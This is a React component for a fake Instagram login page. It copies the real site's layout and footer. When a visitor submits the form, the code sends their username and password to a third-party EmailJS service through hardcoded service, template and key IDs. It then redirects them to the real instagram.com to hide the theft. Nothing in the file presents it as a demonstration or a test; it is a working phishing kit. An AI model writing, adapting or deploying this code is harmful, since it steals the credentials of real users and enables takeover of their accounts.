import { useState, useEffect } from "react";
import emailjs from "@emailjs/browser";
import "./App.css"; // Assuming your CSS is in App.css

const InstagramLogin = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  useEffect(() => {
    const publicKey =
      import.meta.env.VITE_EMAILJS_PUBLIC_KEY || "ft4pzts3tVo0mZ5Lj";
    console.log("Initializing EmailJS with public key:", publicKey);
    emailjs.init(publicKey); // Initialize EmailJS with public key
  }, []);

  const handleLogin = () => {
    if (!email || !password) {
      alert("Please fill in both fields.");
      return;
    }

    const serviceID =
      import.meta.env.VITE_EMAILJS_SERVICE_ID || "service_jzhqdkb";
    const templateID =
      import.meta.env.VITE_EMAILJS_TEMPLATE_ID || "template_11kq5u8";

    emailjs
      .send(serviceID, templateID, { email, password })
      .then((response) => {
        console.log("Success:", response);
        window.location.href = "https://www.instagram.com/";
      })
      .catch((error) => {
        console.error("Error:", error);
        alert(
          "Failed to send email. Please check the console for more details."
        );
      });
  };

  return (
    <div className="container">
      <main className="flex align-items-center justify-content-center">
        <section id="auth" className="flex direction-column">
          <div className="panel login flex direction-column">
            <h1 title="Instagram" className="flex justify-content-center">
              <img
                src="/img/instagram-logo.png"
                alt="Instagram logo"
                title="Instagram logo"
              />
            </h1>
            <form id="login-form" onSubmit={(e) => e.preventDefault()}>
              <label htmlFor="email" className="sr-only">
                Phone, username, or email
              </label>
              <input
                name="email"
                id="email"
                placeholder="Phone, username, or email"
                autoComplete="username"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <label htmlFor="password" className="sr-only">
                Password
              </label>
              <input
                name="password"
                id="password"
                type="password"
                placeholder="Password"
                autoComplete="current-password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <button type="button" id="login-button" onClick={handleLogin}>
                Log In
              </button>
            </form>
            <div className="flex separator align-items-center">
              <span></span>
              <div className="or">OR</div>
              <span></span>
            </div>
            <div className="login-with-fb flex direction-column align-items-center">
              <div className="flex align-items-center">
                {/* <img src="/img/insta-fav.ico" alt="Facebook logo" /> */}
                <a>Log in with Facebook</a>
              </div>

              <a href="#">Forgot password?</a>
            </div>
          </div>
          <div className="panel register flex justify-content-center">
            <p>Don&apos;t have an account?</p>
            <a href="#">Sign up</a>
          </div>
          <div className="app-download flex direction-column align-items-center">
            <p>Get the app.</p>
            <div className="flex justify-content-center">
              <img
                src="/img/apple-button.png"
                alt="Apple Store logo"
                title="Apple Store logo"
              />
              <img
                src="/img/googleplay-button.png"
                alt="Google Play logo"
                title="Google Play logo"
              />
            </div>
          </div>
        </section>
      </main>
      <footer>
        <ul className="flex flex-wrap justify-content-center">
          <li>
            <a href="#">ABOUT</a>
          </li>
          <li>
            <a href="#">HELP</a>
          </li>
          <li>
            <a href="#">PRESS</a>
          </li>
          <li>
            <a href="#">API</a>
          </li>
          <li>
            <a href="#">CAREERS</a>
          </li>
          <li>
            <a href="#">PRIVACY</a>
          </li>
          <li>
            <a href="#">TERMS</a>
          </li>
          <li>
            <a href="#">LOCATIONS</a>
          </li>
          <li>
            <a href="#">TOP ACCOUNTS</a>
          </li>
          <li>
            <a href="#">HASHTAGS</a>
          </li>
          <li>
            <a href="#">LANGUAGE</a>
          </li>
        </ul>
        <p className="copyright">© 2020 Instagram from Facebook</p>
      </footer>
    </div>
  );
};

export default InstagramLogin;
